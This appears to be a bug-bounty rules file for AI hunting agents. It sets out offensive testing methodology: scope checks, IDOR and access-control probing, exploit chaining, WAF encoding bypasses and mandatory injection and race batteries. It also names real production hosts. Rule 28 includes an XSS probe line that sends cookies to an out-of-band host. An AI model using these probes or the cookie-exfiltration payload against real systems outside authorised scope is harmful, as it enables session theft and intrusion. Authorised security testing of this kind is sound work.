# Hunting Rules

These rules are ALWAYS active. Breaking them wastes time and tanks your validity ratio.

## Rule 0: THE ONLY QUESTION THAT MATTERS

> "Can an attacker do this RIGHT NOW against a real user who has taken NO unusual actions — and does it cause real harm (expose sensitive functionality or data, stolen money, leaked PII, account takeover, code execution)?"
>
> If NO — STOP. Do not write. Do not explore further. Move on.

### Theoretical Bug = Wasted Time. Kill These Immediately:

| Pattern | Kill Reason |
|---|---|
| "Could theoretically allow..." | Not exploitable = not a bug |
| "An attacker with X, Y, Z conditions could..." | Too many preconditions |
| "Wrong implementation but no practical impact" | Wrong but harmless = not a bug |
| Dead code with a bug in it | Not reachable = not a bug |
| Source maps without secrets | No impact |
| SSRF with DNS-only callback | Need data exfil or internal access |
| Open redirect alone | Need ATO or OAuth chain |
| "Could be used in a chain if..." | Build the chain first, THEN report |

## Rule 1: READ FULL SCOPE FIRST

Before making a single request: read the program's in-scope and out-of-scope lists.
One out-of-scope request = potential ban. One out-of-scope report = instant close.

## Rule 2: KILL WEAK FINDINGS FAST

Run the 7-Question Gate BEFORE spending time on a finding. Kill at Q1 if needed.
Every minute on a weak finding = a minute not finding a real one.

## Rule 3: 5-MINUTE RULE

If a target surface shows nothing interesting after 5 minutes → move on.

Kill signals:
- All hosts return 403 or static pages
- No API endpoints with ID parameters
- No JavaScript bundles with interesting paths
- nuclei returns 0 medium/high findings

## Rule 4: AUTOMATION = HIGHEST DUP RATE

Use automation for RECON only (subdomain enum, live hosts, URL crawl).
Manual testing finds unique bugs. Automated scanners find duplicates.

## Rule 5: IMPACT-FIRST HUNTING

Ask: "What's the worst thing that could happen if auth was broken here?"
If "nothing valuable" → skip. If "admin access, PII exfil, fund theft" → hunt there.

## Rule 6: HUNT LESS-SATURATED BUG CLASSES

High competition (skip unless target-specific): XSS, basic SSRF, open redirect alone, missing headers
Low competition: Cache poisoning, race conditions, business logic, HTTP smuggling, CI/CD, SAML, OAuth chains

## Rule 7: DEPTH OVER BREADTH

One target deeply understood > ten targets shallowly tested.
Read 5+ disclosed reports for the target before hunting.
Understand the business domain. Map the crown jewels.

## Rule 8: THE SIBLING RULE

> "Check EVERY sibling endpoint. If `/api/user/123/orders` requires auth,
> check `/api/user/123/export`, `/api/user/123/delete`, `/api/user/123/share`."

This rule explains 30% of all paid IDOR/auth bugs.

## Rule 9: A→B SIGNAL METHOD

When you confirm bug A → stop → hunt for B and C before writing the report.
A confirmed bug = signal that the developer made a class of mistake.
They made it elsewhere too. Finding B costs 10x less than finding A.
Time-box: 20 minutes on B. If not confirmed → submit A and move on.

## Rule 10: NEW == UNREVIEWED

Features < 30 days old have the lowest security maturity.
Monitor GitHub commits. Hunt new features first.

## Rule 11: FOLLOW THE MONEY

Billing/credits/refunds/wallet = most developer shortcuts taken.
Price manipulation, race conditions on payment, quota bypass = high ROI.

## Rule 12: 20-MINUTE ROTATION RULE

Every 20 min ask: "Am I making progress?"
No → rotate to next endpoint, subdomain, or vuln class.
Fresh context finds more bugs than brute force.

## Rule 13: BUSINESS IMPACT > VULN CLASS

Clickjacking is usually $0 but MetaMask paid $120K for one.
Ask: "What's the business impact?" before estimating severity.

## Rule 14: VALIDATE BEFORE WRITING

Run /validate before starting a report. Gate 0 is 30 seconds.
It takes 30 seconds to kill a bad lead. A report takes 30 minutes to write.

## Rule 15: CREDENTIAL LEAKS NEED EXPLOITATION PROOF

Finding an API key = Informational.
Proving what the key accesses (S3 read, database, admin panel) = Medium/High.
Always call the API as the leaked key. Enumerate permissions.

## Rule 16: MOBILE = DIFFERENT ATTACK SURFACE

Mobile apps expose endpoints the web app doesn't. Always decompile when in scope:
- Hardcoded secrets in smali/strings that web recon never finds
- API endpoints not in web JS
- Deep-link handlers with injection points
- WebView addJavascriptInterface = JS→Java bridge

## Rule 17: CI/CD IS ATTACK SURFACE

GitHub Actions / GitLab CI with public repos:
- `pull_request_target` + checkout of PR branch = attacker code with repo secrets
- Expression injection in `${{ github.event.issue.title }}` in `run:` blocks
- Self-hosted runners = escape to org infrastructure

## Rule 18: SAML/SSO = HIGHEST AUTH BUG DENSITY

If target uses SSO, always test:
- XML signature wrapping (XSW)
- Comment injection in NameID
- XXE in SAML assertion
- Signature stripping
- NameID manipulation

## Rule 19: NEVER-SUBMIT LIST

Instant kill unless you have a working chain:

```
Missing headers (CSP/HSTS/X-Frame-Options)
Missing SPF/DKIM/DMARC
GraphQL introspection alone
Banner/version disclosure without CVE exploit
Clickjacking without sensitive action PoC
Self-XSS
Open redirect alone
SSRF DNS-only
CORS wildcard without credentialed exfil PoC
Logout CSRF
Rate limit on non-critical forms
Session not invalidated on logout
Concurrent sessions allowed
Internal IP in error message
Missing cookie flags alone
OAuth client_secret in mobile app (expected)
OAuth client_id alone (public by design)
OIDC discovery endpoint (public by design)
SPA client-side config (API URLs, Segment keys)
```

## Rule 20: VERIFY DATA ISN'T ALREADY PUBLIC

Before reporting an API "leak": check the web UI in incognito.
If the same data is visible to any visitor, it's not a leak.

## Rule 21: DEEP CHAINS PAY THE MOST

Individual findings are often low/informational. Chains escalate severity exponentially.
The Renwa chain went from Self-XSS ($0 alone) to Critical ATO ($$$) through 9 links.

**Chain walk algorithm:**
1. Confirm bug A
2. Map what A GIVES you (capability)
3. Search: what bug takes that capability as INPUT?
4. Test it. If confirmed → it becomes the new A
5. Repeat until terminal impact (ATO, RCE, data exfil) or dead end

**Capability → Next Link (most common transitions):**
- JS execution → read cookies/tokens, forge requests, inject into postMessage
- Text injection → code execution (eval, template, SQL), stored XSS
- URL/redirect control → OAuth code theft, iframe content control
- Cookie control → cookie bomb (block callbacks), session fixation
- Cross-origin window ref → URL theft (tokens in URL), postMessage injection
- SSRF → cloud metadata, internal services, IP allowlist bypass
- IDOR read → steal tokens/creds → impersonate → ATO
- File write → web shell → RCE

**Always run `/chain` when you confirm ANY finding.** Even Self-XSS can become Critical ATO.

## Rule 22: PERMISSIONS-FIRST VOLUME STRATEGY

Medium-severity permission bugs at $500-1000/pop, found 1-3/day, is more reliable income than chasing criticals.

**The approach:**
1. Read ALL product documentation — every feature, every role, every permission level
2. Map the permission model — who can do what, where are the boundaries
3. Test every API action against every role — look for discrepancies between UI restrictions and API enforcement
4. Apply the Sibling Rule across the permission model — if one action leaks, the whole class leaks
5. Focus on APIs — they're the most broken surface. UI may enforce permissions client-side while API doesn't

**Priority order for permissions hunting:**
1. BAC (Broken Access Control) — horizontal and vertical privilege escalation
2. IDOR — object-level access control failures
3. Permission model gaps — actions available via API but hidden in UI
4. Role boundary violations — lower role accessing higher role functionality

**Key insight:** Developers make CLASS mistakes. If they forgot auth on one endpoint, they forgot it on 20 others. One bug = signal that the whole product is broken in that class. Don't report and move on — map the entire class first.

**"Broken product" recognition:** When you find your first bug on a product and it was easy, the whole product is likely broken. These products can yield $200K+ in a month. Train yourself to recognize them by the quality of their code, the age of their stack, and the number of features they ship.

## Rule 23: HTTP 200 ≠ IMPACT

A 200 status on a request the user shouldn't make is a lead, not a finding. Impact requires either:
- **Read:** a follow-up request returning data the user shouldn't see (another user's resource, admin-only field, internal state).
- **Write:** a follow-up read confirming the state change persisted and is observable to a second party.

Theoretical language ("could result in...", "an attacker might...") reads as speculation to triagers. Prove it with the actual data in the response, or the finding is not ready.

**Common traps:**
- Status-code asymmetry between own vs other-user's resource — proves auth fired somewhere, not that a leak exists.
- Mass-assignment 400 vs 406 — proves the field was parsed, not that it was persisted. Read it back.
- `404 not found` on unauth endpoints — proves routing reached the query layer, not that unauth data is accessible.

Every IDOR, BAC, mass-assignment, SSRF, and privilege-change candidate ships with a request pair: exploit + independent read-back.

## Rule 24: EXHAUSTION REQUIRES A MUTATION MATRIX

Never mark a vuln class "tested" after a single payload family. Minimum baseline before the verdict "exhausted" is accepted:

1. **Vectors:** query, path, JSON body, form, multipart, headers/cookies, async/webhook.
2. **Methods:** GET/POST/PUT/PATCH/DELETE where the endpoint allows.
3. **Encodings:** raw, URL, double-URL, unicode escape, HTML-entity, mixed-case / separator insertion, **and stacked** (multiple encodings in the same payload, e.g. `html-entity+url` → `%26lt%3Bscript%26gt%3B`, `unicode-escape+url`, `base64+url`). WAFs typically decode once; targets decode twice — stacking beats the gap. For a worked triple-stack (Akamai bypass, HTML-entity + URL + Unicode) see the "Stacked-encoding DOM XSS" payload in `rules/payloads.md`.
4. **Bypasses:** parser differential, alternate delimiters, allowlist confusion, host normalization.

If fewer than 30 meaningful combinations were attempted on a P1 surface, the class is not exhausted. `uv run python3 $CLAUDE_PROJECT_DIR/tools/intel_engine.py matrix <class>` generates the starting combinations; `uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py record <target> recon "coverage-<class>" "<cells tested>"` persists what was covered.

## Rule 25: DIFFERENTIAL TESTING OVER SINGLE RESPONSES

Always compare request pairs/triples, not single responses:

- auth vs unauth
- same request across two roles
- same payload across two parsers / content-types
- same endpoint before/after a state mutation

Interesting deltas include: latency shifts, cache-key confusion, subtle JSON field differences, downstream side effects (emails, webhooks, audit logs), and async callback evidence. A 200 that looks identical can still leak through a header, body length, or timing skew.

## Rule 26: BROWSER + API PARITY CHECK

If the browser blocks an action but the API accepts it, treat as high-value lead. For every critical workflow (auth changes, billing, exports, admin actions), validate all three:

- UI restriction (what the browser enforces client-side)
- raw API enforcement (same action via direct HTTP)
- secondary read-back from a *separate session* to confirm the state actually changed

This catches permission drift — server-side check was forgotten, UI still hides the button — that shallow autopilot loops miss.

## Rule 27: CHAIN SEARCH IS MANDATORY ON EVERY PASS SIGNAL

Any PASS signal must trigger at least one immediate chain attempt before the finding is submitted atomically:

1. Define the capability gained (read / write / exec / control).
2. Query likely next links using `rules/chain-table.md`.
3. Attempt at least 3 next-link candidates, or 20 minutes, whichever comes first.
4. Record dead-end evidence to brain if none land.

Do NOT submit atomic low-impact findings without either proving chain potential or recording chain-dead-end evidence. This keeps low-severity reports from eating the validity ratio.

## Rule 28: ROTATE DETECTION TOKENS — `alert(1)` IS TIER 1 OF 7

`alert(1)` is the most-WAF-blocked, most-overridden detection token in the
field. A negative `alert(1)` result proves the dialog API is muted; it does
NOT prove "no XSS / no JS execution / no prototype-pollution effect / no
CSP bypass". Hunters that conclude "no vuln" after a single `alert`-shaped
probe produce shallow results and will be re-dispatched.

For every XSS, prototype-pollution, CSP-bypass, postMessage, or any
JS-execution probe, walk the rotation ladder until execution is confirmed
or all 7 tiers are exhausted. The ladder lives in `rules/payloads.md`
under "Detection Mechanism Rotation Ladder":

```
Tier 1: alert(1)              Tier 5: window['xss']=Date.now()  (global write)
Tier 2: prompt(1)/confirm(1)  Tier 6: fetch('//oast/?'+cookie)  (OOB + impact in one shot)
Tier 3: console.log()         Tier 7: constructor / token-encoded indirect call
Tier 4: DOM marker mutation
```

Rule of thumb: **if Tier N is blocked, jump 2 tiers down**, not 1. Tier 6
(OOB) is the strongest single-shot proof — it defeats every dialog
defense, captures cookies, and produces report-grade evidence in one
round-trip. Use it early when a target is heavily WAF-protected.

Detection-mechanism diversity directly increases hit rate: a target that
blocks `alert\b` but not `prompt`, or overrides `window.alert` but not
`document.title`, will fire on Tier 2/4 even though Tier 1 looked dead.
Walking all 7 tiers raises confirmation probability from ~30% (alert-only)
to ~85%+ on real-world targets.

A hunter prompt that hard-codes `alert(1)` and stops there is failing
this rule. Every hunter dispatched for a JS-execution-class probe MUST
receive the rotation ladder in its preamble.

## Rule 30: NO CROSS-REGION INFERENCE

A target's hosts in region X are separate test surface from the same
product's region Y, even if the binaries, routes, or status patterns
look identical. Recon, surface probe, and class coverage are per-host —
**you may use another region to seed hypotheses, never to mark
coverage**.

The failure mode this rule was written for: a hunter probed
`prod-*.nu.com.br` exhaustively, found everything hardened, then declared
the corresponding `prod-*.nu.com.co` hosts "exhausted by inference"
without testing them. The CO hosts had different service names
(`milli-vanilli`, `telefonista`, `nuddynho`, `slack-client`) — clearly
different code paths — but were still skipped. A confirmed unauthenticated
write endpoint on the CO side was missed entirely.

The hard gate (`tools/autopilot_gate.py`) rejects brain entries matching
`same-code-as-<region>`, `equivalent-to-<region>`, `<region>-hardened-so`,
`assumed.*same`, and `inferr?ed.*from.*region`. If you genuinely cannot
test a region for a policy reason, record:
`recon-skip:<region> policy:<exact-clause> — <rationale>` and the gate
will accept it.

## Rule 31: CONFIRMED UNAUTH STATE-CHANGE → ADVERSARIAL BATTERY IS MANDATORY

Any unauthenticated POST/PUT/PATCH/DELETE that returns 2xx or 3xx is a
confirmed write surface. You DO NOT walk away from it after recording the
observation. Before the endpoint can be marked exhausted, the
adversarial battery must run with **at least 10 attempts across all five
required dimensions**:

1. **mass-assignment** — privileged JSON fields (role, status, balance,
   credit-score, decision, owner_id, tenant_id, is_admin) injected into
   the request body
2. **payload-fields** — XSS / SSTI / SQLi / log-injection payloads in
   every string field, with the Rule 28 rotation ladder applied
3. **id-collision** — write the same record twice with the same external
   identifier (applicant-id, idempotency-key, request-id) from different
   sessions; race the writes
4. **race-condition** — parallel requests against the endpoint to detect
   non-idempotent state mutations
5. **chain-anchors** — for the resulting capability (write to anonymous
   endpoint), pull the matching anchors from `rules/chain-table.md` and
   probe at least three of them (typical anchors: applicant-flow takeover,
   credit-decision injection, downstream KYC/PSE poisoning)

Brain marker required: `adversarial-battery:<path> attempts:<≥10>
mass-assignment:<done|signal:<details>> payload-fields:<done|signal>
id-collision:<done|signal> race:<done|signal>
chain-anchors:<done|signal:<which-anchor>>
evidence:<file>`. The hard gate validates each dimension is present and
the evidence file exists. Missing dimension or empty evidence file =
gate fail.
